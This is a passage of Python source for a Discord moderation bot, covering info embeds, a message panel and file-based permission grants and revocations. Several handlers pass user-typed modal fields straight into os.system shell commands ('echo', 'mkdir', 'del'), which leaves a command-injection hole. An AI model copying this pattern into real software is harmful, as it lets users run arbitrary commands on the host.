            embed=discord.Embed(title=f"Member information", description=f"**▶ Username:** ``{member.name}``\n**▶ Join the server:** ``{member.joined_at.strftime('%Y-%m-%d %H:%M:%S')}``\n**▶ User Creation Time:** ``{member.created_at.strftime('%Y-%m-%d %H:%M:%S')}``\n\n**User information:**\n**▶ Display Name:** ``{member.display_name}``\n**▶ ID:** ``{member.id}``\n\n**Stats information:**\n**▶ Member Status:** ``{member.status}``\n**▶ Member Activity:** ``{member.activity}``\n**▶ Member Top Role:** ``{member.top_role}``\n\n**Other information:**\n**▶ Member Discord Nitro:** ``{member.premium_since}``\n**▶ If the User is a Bot:** ``{member.bot}``\n\n**Roles information [{len(member.roles)}]:**\n**{memberroles}**", color=0xe800ff)
            embed.set_thumbnail(url=f"{image_link}")
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            f = open("systems\\moderationoptions\\memberid.txt", "w")
            f.write(f"{member.id}")
            f.close()
            await interaction.response.send_message(embed=embed, view=MemberOp(), ephemeral=True)
        except:
            pass

class cri(ui.Modal, title='Check Role Information'):
    roleid = ui.TextInput(label='Role ID')


    async def on_submit(self, interaction: discord.Interaction):
        try:
            role_id = int(self.roleid.value)
            role = discord.utils.get(guild.roles, id=role_id)

            Imagem = discord.utils.get(guild.channels, name="〈💍〉bot-messages")
            image_path = "emojis\\icons8-user-64.png"
            image = Image.open(image_path)
            image_attachment = discord.File(image_path, filename=image_path)
            messageurl = await Imagem.send(file=image_attachment)
            image_link = messageurl.attachments[0].url


            embed=discord.Embed(title=f"Role information", description=f"**▶ Role Name:** ``{role.name}``\n**▶ Role ID:** ``{role.id}``\n**▶ Role Creation Time:** ``{role.created_at}``\n\n**More information:**\n**▶ Role Color:** ``{role.color}``\n**▶ Role position:** ``{role.position}``\n**▶ number of members that have the Role:** ``{len(role.members)}``\n**▶ if role is default:** ``{role.is_default()}``\n\n**Role Permissions information:**\n**▶ If possible tag the Role:** ``{role.mentionable}``\n**▶ Role Mention:** **{role.mention}**\n**▶ Administrator:** ``{role.permissions.administrator}``\n**▶ Manage Channels:** ``{role.permissions.manage_channels}``\n**▶ Manage Roles:** ``{role.permissions.manage_roles}``", color=0xe800ff)
            embed.set_thumbnail(url=f"{image_link}")
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            filetool.WriteTextFile(f"systems\\moderationoptions\\roleid.txt", f"{roleid}")
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except:
            pass

class cci(ui.Modal, title='Check Channel Information'):
    channelid = ui.TextInput(label='Channel ID')

    async def on_submit(self, interaction: discord.Interaction):
        try:
            channel_id = int(self.channelid.value)
            channel = discord.utils.get(guild.channels, id=channel_id)

            Imagem = discord.utils.get(guild.channels, name="〈💍〉bot-messages")
            image_path = "emojis\\icons8-user-64.png"
            image = Image.open(image_path)
            image_attachment = discord.File(image_path, filename=image_path)
            messageurl = await Imagem.send(file=image_attachment)
            image_link = messageurl.attachments[0].url


            embed=discord.Embed(title=f"Channel information", description=f"**▶ channel Name:** ``{channel.name}``\n**▶ channel ID:** ``{channel.id}``\n**▶ channel Creation Time:** ``{channel.created_at}``\n\n**More information:**\n**▶ Channel Type:** ``{channel.type}``\n**▶ Channel position:** ``{channel.position}``", color=0xe800ff)
            embed.set_thumbnail(url=f"{image_link}")
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            filetool.WriteTextFile(f"systems\\moderationoptions\\channelid.txt", f"{channel_id}")
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except:
            pass


class messagepanell(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)


    @discord.ui.button(label="〈📘〉Send Message", style=discord.ButtonStyle.gray, custom_id="messagepanell_view:Sendm")
    async def Sendm(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(mp_SendMessage())


    @discord.ui.button(label="〈📗〉Create Message", style=discord.ButtonStyle.gray, custom_id="messagepanell_view:cSendm")
    async def cSendm(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(mp_CreateMessage())
    
    @discord.ui.button(label="〈📙〉Send a prepared message", style=discord.ButtonStyle.gray, custom_id="messagepanell_view:idSendm")
    async def idSendm(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(mp_SendSMessage())
    
    @discord.ui.button(label="〈📚〉Check all messages", style=discord.ButtonStyle.gray, custom_id="messagepanell_view:idSendmc")
    async def idSendmc(self, interaction: discord.Interaction, button: discord.ui.Button):
        point = "systems\\messagepanel\\messages"
        number = 0
        embeds=discord.Embed(title=f"Checking all messages", description=f"**Display option for all messages created and saved by the bot**", color=0x00ffe5)
        for files in os.listdir(f"{point}"):
            number += 1
            embeds.add_field(name=f"Message Number {number}", value=f"**Message ID:** ``{files}``", inline=True)
            embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embeds.set_thumbnail(url=f"{servericon}")
            embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await interaction.response.send_message(embed=embeds, ephemeral=True)


class mp_CreateMessage(ui.Modal, title='Create Message'):
    IDm = ui.TextInput(label='Message ID')
    titleMessage = ui.TextInput(label='Message Title')
    messageDes = ui.TextInput(label='Description of the Message', style=discord.TextStyle.paragraph)
    color = ui.TextInput(label='Embed Color')
    Link = ui.TextInput(label='Link to the message or write False')

    async def on_submit(self, interaction: discord.Interaction):
        point = "systems\\messagepanel\\messages"
        if os.path.exists(f"{point}\\{self.IDm}"):
            await interaction.response.send_message("The message ID already exists", ephemeral=True)
        if not os.path.exists(f"{point}\\{self.IDm}"):
            os.system(f"mkdir {point}\\{self.IDm}")
            f = open(f"{point}\\{self.IDm}\\title" + ".txt", f"w")
            f.write(f"{self.titleMessage}")
            f.close()
            f = open(f"{point}\\{self.IDm}\\des" + ".txt", f"w")
            f.write(f"{self.messageDes}")
            f.close()
            f = open(f"{point}\\{self.IDm}\\Link" + ".txt", f"w")
            f.write(f"{self.Link}")
            f.close()
            f = open(f"{point}\\{self.IDm}\\color" + ".txt", f"w")
            f.write(f"0x{self.color}")
            f.close()
            await interaction.response.send_message("The message has been created", ephemeral=True)


class mp_SendMessage(ui.Modal, title='Send Message'):
    titleMessage = ui.TextInput(label='Message Title')
    messageDes = ui.TextInput(label='Description of the Message', style=discord.TextStyle.paragraph)
    color = ui.TextInput(label='Embed Color')
    Link = ui.TextInput(label='Link to the message or write False')
    channelids = ui.TextInput(label='Channel ID')

    async def on_submit(self, interaction: discord.Interaction):
        os.system(f"echo 0x{self.color} > Sendc.txt")
        f = open("Sendc.txt", "r")
        c = f.read()
        f.close()
        os.system("del Sendc.txt")
        embedcolorreadd = int(c, 16)
        Imagem = discord.utils.get(guild.channels, name="〈💍〉bot-messages")
        image_path = "emojis\\2572-annoucement.png"
        image = Image.open(image_path)
        image_attachment = discord.File(image_path, filename=image_path)
        #messageurl = await Imagem.send(file=image_attachment)
        #image_link = messageurl.attachments[0].url
        try:
            os.system(f"echo {self.channelids} > Send.txt")
            f = open("Send.txt", "r")
            id = int(f.read())
            f.close()
        except:
            f.close()
            pass
        os.system("del Send.txt")
        os.system(f"echo {self.Link} > SendL.txt")
        f = open("SendL.txt", "r")
        Slink = str(f.read())
        f.close()
        os.system("del SendL.txt")
        try:
            messageSend = discord.utils.get(guild.channels, id=id)
            if messageSend:
                embeds=discord.Embed(title=f"{self.titleMessage}", description=f"{self.messageDes}", color=embedcolorreadd)
                if "http" in Slink:
                    embeds.add_field(name=f"Message Link", value=f"[Click Here]({self.Link})", inline=True)
                embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embeds.set_thumbnail(url=f"{servericon}")
                embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                await messageSend.send(embed=embeds)
                await interaction.response.send_message("The completed successfully", ephemeral=True)
        except:
            await interaction.response.send_message("The Channel does not exist or there is a problem with your formatt", ephemeral=True)


class mp_SendSMessage(ui.Modal, title='Send Message'):
    messageid = ui.TextInput(label='Message ID')
    channelids = ui.TextInput(label='Channel ID')

    async def on_submit(self, interaction: discord.Interaction):
        point = f"systems\\messagepanel\\messages\\{self.messageid}"
        if os.path.exists(f"{point}"):
            f = open(f"{point}\\color.txt", "r")
            c = f.read()
            f.close()
            f = open(f"{point}\\title.txt", "r")
            title = f.read()
            f.close()
            f = open(f"{point}\\des.txt", "r")
            des = f.read()
            f.close()
            f = open(f"{point}\\Link.txt", "r")
            Link = f.read()
            f.close()
            embedcolorreadd = int(c, 16)
            Imagem = discord.utils.get(guild.channels, name="〈💍〉bot-messages")
            image_path = "emojis\\2572-annoucement.png"
            image = Image.open(image_path)
            image_attachment = discord.File(image_path, filename=image_path)
            #messageurl = await Imagem.send(file=image_attachment)
            #image_link = messageurl.attachments[0].url
            try:
                os.system(f"echo {self.channelids} > Send.txt")
                f = open("Send.txt", "r")
                id = int(f.read())
                f.close()
            except:
                f.close()
                pass
            try:
                messageSend = discord.utils.get(guild.channels, id=id)
                if messageSend:
                    embeds=discord.Embed(title=f"{title}", description=f"{des}", color=embedcolorreadd)
                    if "http" in Link:
                        embeds.add_field(name=f"Message Link", value=f"[Click Here]({Link})", inline=True)
                    embeds.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embeds.set_thumbnail(url=f"{servericon}")
                    embeds.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                    await messageSend.send(embed=embeds)
                    await interaction.response.send_message("The completed successfully", ephemeral=True)
            except:
                await interaction.response.send_message("The Channel does not exist or there is a problem with your formatt", ephemeral=True)
        if not os.path.exists(f"{point}"):
            await interaction.response.send_message("There is no such message", ephemeral=True)



class secadd(discord.ui.View):
    @discord.ui.select(
        placeholder = "select menu",
        min_values = 1,
        max_values = 1,
        options = [
                discord.SelectOption(
                    label="Add Roles",
                    description="Add permission to Add Roles",
                    emoji="🎁"
                ),
                discord.SelectOption(
                    label="Join Bot",
                    description="Add permission to attach bots",
                    emoji="🤖"
                ),
                discord.SelectOption(
                    label="Delete Channels",
                    description="Add permission to Delete Channels",
                    emoji="⚠️"
                ),
                discord.SelectOption(
                    label="Delete Roles",
                    description="Add permission to Delete Roles",
                    emoji="⚠️"
                ),
                discord.SelectOption(
                    label="Kick Members",
                    description="Add permission to Kick Members",
                    emoji="❓"
                ),
                discord.SelectOption(
                    label="Ban Members",
                    description="Add permission to Ban Members",
                    emoji="❔"
                ),
                discord.SelectOption(
                    label="Create Channel",
                    description="Add permission to Create Channels",
                    emoji="🔨"
                ),
                discord.SelectOption(
                    label="Create Role",
                    description="Add permission to Create Roles",
                    emoji="🔨"
                ),
                discord.SelectOption(
                    label="Update Channel",
                    description="Add permission to Update Channels",
                    emoji="🔧"
                ),
                discord.SelectOption(
                    label="Update Role",
                    description="Add permission to Update Roles",
                    emoji="🔧"
                ),
                discord.SelectOption(
                    label="Update Server",
                    description="Add permission to Update Server",
                    emoji="🔧"
                ),
                discord.SelectOption(
                    label="ALL",
                    description="Add permission to everything",
                    emoji="🌐"
                ),
        ]
    )
    async def select_callback(self, select, interaction):
        if interaction.values[0] == "Add Roles":
            await select.response.send_modal(addpsec_addrole())
        if interaction.values[0] == "Join Bot":
            await select.response.send_modal(addpsec_joinbot())
        if interaction.values[0] == "Delete Channels":
            await select.response.send_modal(addpsec_DeleteChannelsperm())
        if interaction.values[0] == "Delete Roles":
            await select.response.send_modal(addpsec_Deleterolesperm())
        if interaction.values[0] == "Kick Members":
            await select.response.send_modal(addpsec_KickMembersperm())
        if interaction.values[0] == "Ban Members":
            await select.response.send_modal(addpsec_banMembersperm())
        if interaction.values[0] == "Create Channel":
            await select.response.send_modal(addpsec_CreateChannel())
        if interaction.values[0] == "Create Role":
            await select.response.send_modal(addpsec_CreateRole())
        if interaction.values[0] == "Update Channel":
            await select.response.send_modal(addpsec_UpChannel())
        if interaction.values[0] == "Update Role":
            await select.response.send_modal(addpsec_UpRole())
        if interaction.values[0] == "Update Server":
            await select.response.send_modal(addpsec_UpServer())
        if interaction.values[0] == "ALL":
            await select.response.send_modal(addpsec_all())


class addpsec_addrole(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}addrole\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)

class addpsec_joinbot(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}joinbot\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class addpsec_Deleterolesperm(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}Deleterolesperm\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class addpsec_DeleteChannelsperm(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}DeleteChannelsperm\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class addpsec_KickMembersperm(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}KickMembersperm\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class addpsec_banMembersperm(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}banMembersperm\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class addpsec_CreateChannel(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}CreateChannel\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class addpsec_CreateRole(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}CreateRole\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)

class addpsec_UpChannel(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}UpChannel\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class addpsec_UpRole(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}UpRole\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class addpsec_UpServer(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}UpServer\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)

class addpsec_all(ui.Modal, title='Add Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "echo > systems\\security\\Permissions\\"
        try:
            os.system(f"{p}banMembersperm\\{self.memberid}.txt")
            os.system(f"{p}KickMembersperm\\{self.memberid}.txt")
            os.system(f"{p}DeleteChannelsperm\\{self.memberid}.txt")
            os.system(f"{p}Deleterolesperm\\{self.memberid}.txt")
            os.system(f"{p}joinbot\\{self.memberid}.txt")
            os.system(f"{p}addrole\\{self.memberid}.txt")
            os.system(f"{p}CreateChannel\\{self.memberid}.txt")
            os.system(f"{p}CreateRole\\{self.memberid}.txt")
            os.system(f"{p}UpRole\\{self.memberid}.txt")
            os.system(f"{p}UpChannel\\{self.memberid}.txt")
            os.system(f"{p}UpServer\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class secdel(discord.ui.View):
    @discord.ui.select(
        placeholder = "select menu",
        min_values = 1,
        max_values = 1,
        options = [
                discord.SelectOption(
                    label="Add Roles",
                    description="Remove permission to Add Roles",
                    emoji="🎁"
                ),
                discord.SelectOption(
                    label="Join Bot",
                    description="Remove permission to attach bots",
                    emoji="🤖"
                ),
                discord.SelectOption(
                    label="Delete Channels",
                    description="Remove permission to Delete Channels",
                    emoji="⚠️"
                ),
                discord.SelectOption(
                    label="Delete Roles",
                    description="Remove permission to Delete Roles",
                    emoji="⚠️"
                ),
                discord.SelectOption(
                    label="Kick Members",
                    description="Remove permission to Kick Members",
                    emoji="❓"
                ),
                discord.SelectOption(
                    label="Ban Members",
                    description="Remove permission to Ban Members",
                    emoji="❔"
                ),
                discord.SelectOption(
                    label="Create Channel",
                    description="Remove permission to Create Channels",
                    emoji="🔨"
                ),
                discord.SelectOption(
                    label="Create Role",
                    description="Remove permission to Create Roles",
                    emoji="🔨"
                ),
                discord.SelectOption(
                    label="Update Channel",
                    description="Remove permission to Update Channels",
                    emoji="🔧"
                ),
                discord.SelectOption(
                    label="Update Role",
                    description="Remove permission to Update Roles",
                    emoji="🔧"
                ),
                discord.SelectOption(
                    label="Update Server",
                    description="Remove permission to Update Server",
                    emoji="🔧"
                ),
                discord.SelectOption(
                    label="ALL",
                    description="Remove permission to everything",
                    emoji="🌐"
                ),
        ]
    )
    async def select_callback(self, select, interaction):
        if interaction.values[0] == "Add Roles":
            await select.response.send_modal(delpsec_addrole())
        if interaction.values[0] == "Join Bot":
            await select.response.send_modal(delpsec_joinbot())
        if interaction.values[0] == "Delete Channels":
            await select.response.send_modal(delpsec_DeleteChannelsperm())
        if interaction.values[0] == "Delete Roles":
            await select.response.send_modal(delpsec_Deleterolesperm())
        if interaction.values[0] == "Kick Members":
            await select.response.send_modal(delpsec_KickMembersperm())
        if interaction.values[0] == "Ban Members":
            await select.response.send_modal(delpsec_banMembersperm())
        if interaction.values[0] == "Create Channel":
            await select.response.send_modal(delpsec_CreateChannel())
        if interaction.values[0] == "Create Role":
            await select.response.send_modal(delpsec_CreateRole())
        if interaction.values[0] == "Update Channel":
            await select.response.send_modal(delpsec_UpChannel())
        if interaction.values[0] == "Update Role":
            await select.response.send_modal(delpsec_UpRole())
        if interaction.values[0] == "Update Server":
            await select.response.send_modal(delpsec_UpServer())
        if interaction.values[0] == "ALL":
            await select.response.send_modal(delpsec_all())




class delpsec_addrole(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}addrole\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)

class delpsec_joinbot(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}joinbot\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class delpsec_Deleterolesperm(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}Deleterolesperm\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class delpsec_DeleteChannelsperm(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}DeleteChannelsperm\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class delpsec_KickMembersperm(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}KickMembersperm\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class delpsec_banMembersperm(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}banMembersperm\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)

class delpsec_CreateChannel(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}CreateChannel\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class delpsec_CreateRole(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}CreateRole\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)

class delpsec_UpChannel(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}UpChannel\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class delpsec_UpRole(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}UpRole\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)

class delpsec_UpServer(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}UpServer\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)

class delpsec_all(ui.Modal, title='Delete Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "del systems\\security\\Permissions\\"
        try:
            os.system(f"{p}banMembersperm\\{self.memberid}.txt")
            os.system(f"{p}KickMembersperm\\{self.memberid}.txt")
            os.system(f"{p}DeleteChannelsperm\\{self.memberid}.txt")
            os.system(f"{p}Deleterolesperm\\{self.memberid}.txt")
            os.system(f"{p}joinbot\\{self.memberid}.txt")
            os.system(f"{p}addrole\\{self.memberid}.txt")
            os.system(f"{p}CreateChannel\\{self.memberid}.txt")
            os.system(f"{p}CreateRole\\{self.memberid}.txt")
            os.system(f"{p}UpRole\\{self.memberid}.txt")
            os.system(f"{p}UpChannel\\{self.memberid}.txt")
            os.system(f"{p}UpServer\\{self.memberid}.txt")
        except:
            pass
        await interaction.response.send_message("The operation completed successfully", ephemeral=True)


class checkpermissions(ui.Modal, title='Check Permissions'):
    memberid = ui.TextInput(label='Member ID')

    async def on_submit(self, interaction: discord.Interaction):
        p = "systems\\security\\Permissions"
        permissions = f""
        if os.path.exists(f"{p}\\addrole\\{self.memberid}.txt"):
            permissions += "+ Add Roles\n"
        if not os.path.exists(f"{p}\\addrole\\{self.memberid}.txt"):
            permissions += "- Add Roles\n"
        
        if os.path.exists(f"{p}\\banMembersperm\\{self.memberid}.txt"):
            permissions += "+ Ban Members\n"
        if not os.path.exists(f"{p}\\banMembersperm\\{self.memberid}.txt"):
            permissions += "- Ban Members\n"

        if os.path.exists(f"{p}\\KickMembersperm\\{self.memberid}.txt"):
            permissions += "+ Kick Members\n"
        if not os.path.exists(f"{p}\\KickMembersperm\\{self.memberid}.txt"):
            permissions += "- Kick Members\n"

        if os.path.exists(f"{p}\\DeleteChannelsperm\\{self.memberid}.txt"):
            permissions += "+ Delete Channels\n"
        if not os.path.exists(f"{p}\\DeleteChannelsperm\\{self.memberid}.txt"):
            permissions += "- Delete Channels\n"

        if os.path.exists(f"{p}\\Deleterolesperm\\{self.memberid}.txt"):
            permissions += "+ Delete Roles\n"
        if not os.path.exists(f"{p}\\Deleterolesperm\\{self.memberid}.txt"):
            permissions += "- Delete Roles\n"
        
        if os.path.exists(f"{p}\\joinbot\\{self.memberid}.txt"):
            permissions += "+ Attach Bots\n"
        if not os.path.exists(f"{p}\\joinbot\\{self.memberid}.txt"):
            permissions += "- Attach Bots\n"

        if os.path.exists(f"{p}\\CreateChannel\\{self.memberid}.txt"):
            permissions += "+ Create Channels\n"
        if not os.path.exists(f"{p}\\CreateChannel\\{self.memberid}.txt"):
            permissions += "- Create Channels\n"

        if os.path.exists(f"{p}\\CreateRole\\{self.memberid}.txt"):
            permissions += "+ Create Roles\n"
        if not os.path.exists(f"{p}\\CreateRole\\{self.memberid}.txt"):
            permissions += "- Create Roles\n"

        if os.path.exists(f"{p}\\UpChannel\\{self.memberid}.txt"):
            permissions += "+ Update Channels Name\n"
        if not os.path.exists(f"{p}\\UpChannel\\{self.memberid}.txt"):
            permissions += "- Update Channels Name\n"

        if os.path.exists(f"{p}\\UpRole\\{self.memberid}.txt"):
            permissions += "+ Update Roles Name\n"
        if not os.path.exists(f"{p}\\UpRole\\{self.memberid}.txt"):
            permissions += "- Update Roles Name\n"
        
        if os.path.exists(f"{p}\\UpServer\\{self.memberid}.txt"):
            permissions += "+ Update Server Name\n"
        if not os.path.exists(f"{p}\\UpServer\\{self.memberid}.txt"):
            permissions += "- Update Server Name\n"
        await interaction.response.send_message(f"```diff\nThe list of permissions\n{permissions}\n```", ephemeral=True)


@tasks.loop()
async def rolelistloop1(seconds=4):
    await asyncio.sleep(1200)
    numberfolders = 1
    for folders in os.listdir("systems\\rolelist"):
        numberfolders = str(numberfolders)
        rolelist1 = open(f"systems\\rolelist\\rolelist{numberfolders}\\rolelist.txt", "r")
        rolelistt1 = rolelist1.read()
        rolelist1.close()
        if rolelistt1 == "true":
            crolelist = open(f"systems\\rolelist\\rolelist{numberfolders}\\crolelist.txt", "r")
            crolelistt = int(crolelist.read())
            crolelist.close()
            title = open(f"systems\\rolelist\\rolelist{numberfolders}\\title.txt", "r", encoding="utf-8")
            titlee = title.read()
            title.close()
            des = open(f"systems\\rolelist\\rolelist{numberfolders}\\description.txt", "r", encoding="utf-8")
            dess = des.read()
            des.close()
            embedcolorr = open(f"systems\\rolelist\\rolelist{numberfolders}\\embedcolor.txt", "r")
            embedcolor = embedcolorr.read()
            embedcolorr.close()
            embedcolorread = int(embedcolor, 16)
            embed=discord.Embed(title=f"{titlee}", description=f"**{dess}**", color=embedcolorread)
            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embed.set_thumbnail(url=f"{servericon}")
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            numberl = 1
            for folder in os.listdir(f"systems\\rolelist\\rolelist{numberfolders}\\rolelist"):
                numberl = str(numberl)
                if folder == f"rolelist{numberl}":
                    p = f"systems\\rolelist\\rolelist{numberfolders}\\rolelist\\rolelist{numberl}"
                    rrolelist = open(f"{p}\\rolelist{numberl}.txt", "r")
                    rrolelistt = rrolelist.read()
                    rrolelist.close()
                    if rrolelistt == "true":
                        name = open(f"{p}name.txt", "r", encoding="utf-8")
                        namen = name.read()
                        name.close()
                        roleid = open(f"{p}roleid.txt", "r")
                        roleidd = int(roleid.read())
                        roleid.close()
                        status = open(f"{p}st.txt", "r")
                        statuss = status.read()
                        status.close()
                        rolelistrole = discord.utils.get(guild.roles, id=roleidd)
                        field = ""
                        try:
                            if statuss == "1":
                                for member in rolelistrole.members:
                                    field += f"``{member.name}#{member.discriminator}``\n"
                                members = len(rolelistrole.members)
                                field += f"**Total Members:** ``{members}`` **RoleName:** ``{rolelistrole.name}``"
                                embed.add_field(name=f"{namen}", value=f"{field}", inline=False)
                            if statuss == "2":
                                for member in rolelistrole.members:
                                    field += f"{member.mention}\n"
                                members = len(rolelistrole.members)
                                field += f"**Total Members:** ``{members}`` **RoleName:** ``{rolelistrole.name}``"
                                embed.add_field(name=f"{namen}", value=f"{field}", inline=False)
                        except:
                            pass
                numberl = int(numberl)
                numberl += 1
            rolelistchannel = discord.utils.get(guild.channels, id=crolelistt)
            await rolelistchannel.purge()
            await rolelistchannel.send(embed=embed)
            numberfolders = int(numberfolders)
            numberfolders += 1

class staffforms(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="〈📋〉Submit forms", style=discord.ButtonStyle.grey, custom_id="st_view:stt")
    async def stt(self, interaction: discord.Interaction, button: discord.ui.Button):
        f = open("systems\\staff-forms\\lock.txt", "r")
        lock = f.read()
        f.close()
        if lock == "true":
            if os.path.exists(f"systems\\staff-forms\\staff-forms\\list\\{interaction.user.id}"):
                await interaction.response.send_message(f'You have already submitted forms', ephemeral=True)
